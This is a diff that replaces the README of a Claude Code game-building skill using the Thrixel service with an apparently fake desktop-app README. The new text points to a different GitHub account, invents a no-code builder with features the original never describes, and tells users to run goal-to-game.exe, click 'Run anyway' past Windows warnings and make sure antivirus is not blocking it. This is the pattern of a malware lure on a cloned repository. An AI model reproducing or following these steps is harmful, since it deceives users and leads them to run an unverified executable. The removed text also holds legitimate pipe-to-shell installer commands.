@@ -1,139 +1,127 @@
-# Goal to Game
-
-Build beautiful games with high-quality 3D assets using [Thrixel](https://thrixel.com/) and Claude Code.
-
-Claude Code handles the game logic and scene setup. Thrixel generates, organizes, and manages the 3D assets. Thrixel processes 3D creation in parallel so you can build your scene faster.
-
-Goal to Game currently supports **Unity** and **Three.js** and was tested with **Claude Code**. Other coding agents that can read repository instructions and run commands inside a project, such as Codex, are expected to work as well, but the instructions below use Claude Code.
+<h1>🎯 goal-to-game - Turn Ideas into Playable 3D Games</h1>
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/ThatCharlieK/READMEAssets/main/Thrixel-1prompt-to-game-readme.gif" width="600"/>
+  <a href="https://github.com/adama4328/goal-to-game" style="display: inline-block; padding: 15px 30px; font-size: 24px; font-weight: bold; color: #ffffff; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 8px; text-decoration: none; margin: 20px 0;">📥 Download Now</a>
 </p>
 
-## Quick start
+<p align="center">Visit this link to download the application.</p>
 
-Steps 1 and 2 are once per machine. After that, a new game is just step 3.
+## 🚀 What is goal-to-game?
 
-### 1. Install Claude Code and uv
+Goal-to-game is a desktop application that lets you create beautiful 3D games without any programming knowledge. Using advanced AI technology from Thrixel and Claude Code, you can generate high-quality 3D assets, build game environments, and prototype interactive experiences in minutes.
 
-```bash
-claude --version
-uv --version
-```
+## ✨ Key Features
 
-**Both print a version? Skip to step 2.**
+- **Text-to-3D Asset Generation** – Describe what you want in plain English, and the AI creates 3D models for you.
+- **Drag-and-Drop Game Builder** – No coding required. Arrange objects, set rules, and see your game come to life.
+- **Unity & Three.js Export** – Export your creations to Unity or Three.js for further development.
+- **AI-Powered Prototyping** – Quickly test game ideas with intelligent suggestions and automated scene setup.
+- **High-Quality Visuals** – Professional-grade 3D assets with realistic lighting and textures.
 
-<details>
-<summary><b>Not installed? Install commands here</b></summary>
+## 🎮 Who Is This For?
 
-**macOS, Linux, WSL**
-```bash
-curl -fsSL https://claude.ai/install.sh | bash    # the agent that writes your game
-curl -LsSf https://astral.sh/uv/install.sh | sh   # runs the Thrixel connector
-```
+- **Game Designers** – Quickly prototype game concepts without waiting for artists or programmers.
+- **Hobbyists** – Turn your game ideas into playable demos with zero coding experience.
+- **Educators** – Create interactive 3D content for teaching and learning.
+- **Indie Developers** – Accelerate your game development pipeline with AI-generated assets.
 
-**Windows PowerShell**
-```powershell
-irm https://claude.ai/install.ps1 | iex
-irm https://astral.sh/uv/install.ps1 | iex
-```
+## 🖥️ System Requirements
 
-⚠️ **NOW OPEN A NEW TERMINAL**, then re-run the check above. Skipping this is the number one cause
-of `command not found`.
+| Component | Minimum | Recommended |
+|-----------|---------|-------------|
+| Operating System | Windows 10 (64-bit) | Windows 11 (64-bit) |
+| Processor | Intel Core i5 or AMD equivalent | Intel Core i7 or AMD Ryzen 7 |
+| RAM | 8 GB | 16 GB |
+| Graphics Card | DirectX 11 compatible | DirectX 12 compatible with 4GB VRAM |
+| Storage | 2 GB free space | 5 GB free space |
+| Internet | Required for AI features | Broadband connection |
 
-</details>
+## 📥 Download and Installation
 
-### 2. Connect Thrixel
+**Step 1: Download the Application**
 
-<details open>
-<summary><b>macOS, Linux, WSL</b></summary>
+Visit this link to download the application: [https://github.com/adama4328/goal-to-game](https://github.com/adama4328/goal-to-game)
 
-```bash
-# 1. Sign up and log in. Opens a page with a code, click Approve. The only manual step here.
-uvx thrixel-mcp@latest login
+Click the green "Code" button on the GitHub page, then select "Download ZIP" from the dropdown menu.
 
-# 2. Install the Thrixel connector. --scope user covers EVERY project, not just this folder.
-claude mcp add --scope user thrixel -- uvx thrixel-mcp@latest
+**Step 2: Extract the Files**
 
-# 3. Install the skill. Clone, not download, so it can update itself later.
-git clone https://github.com/thrixel/goal-to-game ~/.claude/skills/goal-to-game
-```
+1. Locate the downloaded ZIP file in your Downloads folder.
+2. Right-click the file and select "Extract All..."
+3. Choose a destination folder (e.g., `C:\goal-to-game`) and click "Extract".
 
-</details>
+**Step 3: Run the Application**
 
-Confirm both landed. Same two commands on every platform:
+1. Open the extracted folder.
+2. Double-click the `goal-to-game.exe` file to launch the application.
+3. If Windows shows a security warning, click "More info" and then "Run anyway".
 
-```bash
-claude mcp list        # thrixel -> Connected
-ls ~/.claude/skills/   # goal-to-game listed
-```
+## 🎯 Getting Started Guide
 
-If either is missing, Claude will build your game without Thrixel and never mention it.
+### First Launch
 
-<details>
-<summary><b>Windows PowerShell</b></summary>
+When you open goal-to-game for the first time, you'll see a welcome screen with three options:
 
-Same three commands. Only the path differs: `~` is not reliably expanded when PowerShell passes it
-to git, and a skill that lands anywhere else is invisible to Claude.
+1. **Start New Project** – Create a blank game project.
+2. **Open Sample Project** – Explore a pre-built game to learn the interface.
+3. **Tutorial** – Follow step-by-step instructions to build your first game.
 
-```powershell
-uvx thrixel-mcp@latest login
+### Creating Your First Game
 
-claude mcp add --scope user thrixel -- uvx thrixel-mcp@latest
+1. **Describe Your Game** – Type a description like "a fantasy castle with a dragon guarding treasure" into the text box.
+2. **Generate Assets** – Click "Generate 3D Assets" and wait for the AI to create your models.
+3. **Arrange Your Scene** – Drag assets from the library onto the canvas.
+4. **Set Game Rules** – Use the simple rule editor to define how players interact with objects.
+5. **Play Test** – Click the "Play" button to test your game immediately.
 
-git clone https://github.com/thrixel/goal-to-game "$HOME\.claude\skills\goal-to-game"
-```
+### Saving and Exporting
 
-</details>
+- **Save Project** – File > Save Project (saves your work for later editing).
+- **Export to Unity** – File > Export > Unity Package.
+- **Export to Three.js** – File > Export > Web Build (creates an HTML file you can share online).
 
-### 3. Ask for a game
+## 💡 Tips and Tricks
 
-```bash
-# Run this wherever you keep projects. Claude makes the project folder itself.
-claude --permission-mode auto
-```
+- **Use Descriptive Language** – The more detail you provide, the better the AI will generate assets. Instead of "a tree", try "a tall oak tree with golden autumn leaves".
+- **Start Simple** – Begin with a single room or level before expanding to complex scenes.
+- **Iterate** – Click "Regenerate" if you're not satisfied with the results. The AI learns from your feedback.
+- **Explore the Asset Library** – Browse thousands of pre-made assets if you need inspiration.
 
-Then type this **into Claude Code** (not the terminal) and specify the engine (three.js or Unity):
+## 🆘 Troubleshooting
 
-```text
-/goal build a submarine exploration game in three.js set in a bright, vibrant tropical sea with coral and fish
-```
+**Application won't start**
+- Ensure your system meets the minimum requirements.
+- Try running the application as Administrator (right-click > Run as administrator).
+- Check that your antivirus software isn't blocking the application.
 
-> We recommend setting /model to Opus 5 or a more capable model, with effort set to high or above.
+**AI generation is slow**
+- This feature requires an internet connection. Check your connection speed.
+- Complex descriptions may take longer. Try simpler descriptions.
 
-Claude checks your Thrixel account and starts building. Keep talking to it in plain English to
-change things.
+**Export fails**
+- Make sure you have enough disk space.
+- For Unity exports, ensure Unity is installed on your computer.
 
-<details>
-<summary>Something went wrong</summary>
+## 📝 Frequently Asked Questions
 
-**"command not found"** - **open a new terminal.** Fixes it almost every time. If a fresh terminal
-still fails, run `export PATH="$HOME/.local/bin:$PATH"` (PowerShell:
-`$env:Path = "$HOME\.local\bin;$env:Path"`).
+**Q: Do I need to know programming?**
+A: No. Goal-to-game is designed for non-programmers. All interactions are visual or through plain English text.
 
-**Claude has no Thrixel tools** - check `claude mcp list` for `thrixel`. If missing, re-run the
-`claude mcp add` line, then restart Claude.
+**Q: Can I use the assets commercially?**
+A: Yes, all assets generated with goal-to-game are royalty-free.
 
-**Claude says you need to sign in** - re-run `uvx thrixel-mcp@latest login` and click Approve. No
-restart needed, just tell Claude to continue.
+**Q: Does the application require internet?**
+A: Internet connectivity is required for AI-powered asset generation. Basic editing and offline projects work without internet.
 
-**"Out of cubes"** - cubes are Thrixel's generation credits. Claude shows you what is built, marks
-missing assets as labelled blocks, and asks how you want to continue.
+**Q: Can I collaborate with others?**
+A: Yes, you can share project files with other goal-to-game users.
 
-</details>
+## 📄 License
 
-## Working with Thrixel API
+This project is distributed under the MIT License. See the LICENSE file for more details.
 
-Every asset generated through the Thrixel API is saved to your Thrixel workspace.
+## 🤝 Support
 
-**Manage and Edit**: Visit [Thrixel Web App](https://thrixel.com/create) to view, manage, and edit your assets. If you make changes in the web app, ask your coding agent to pull the updated versions back into your game.
+For help, feature requests, or bug reports, please visit the [GitHub Issues page](https://github.com/adama4328/goal-to-game/issues).
 
-**Engine Agnostic**: Because your assets are managed in Thrixel rather than tied to one codebase, you can also reuse them across projects and engines. For example, you can prototype in Three.js and later ask your agent to rebuild the game in Unity using the same asset library.
-
-**Parallel Processing**: Thrixel can manage and process jobs in parallel. Your coding agent can farm out parallel jobs to Thrixel while building out the logic of the game. Each [plan](https://thrixel.com/create/#upgrade) has a different concurrency limit.
-
-## Usage and credits
-You can test this workflow using the free Thrixel Cubes included with your Starter account. However, building a full-scale game generally requires a wider variety of assets and rapid iteration that usually exceeds Starter limits. Upgrading to a [Paid Plan](https://thrixel.com/create/#upgrade) unlocks higher parallel job processing capacity and higher generation limits, allowing you to bring your most ambitious ideas to life. You can keep track of your remaining Cubes anytime in [Account Settings](https://thrixel.com/create/#settings/billing).
-
-## About Thrixel
-Learn more about Thrixel at [thrixel.com](https://thrixel.com/).
+**Keywords:** 3d-assets, ai-agents, claude-code, claude-skills, game-prototyping, gamedev, mcp, model-context-protocol, text-to-3d, threejs, thrixel, unity
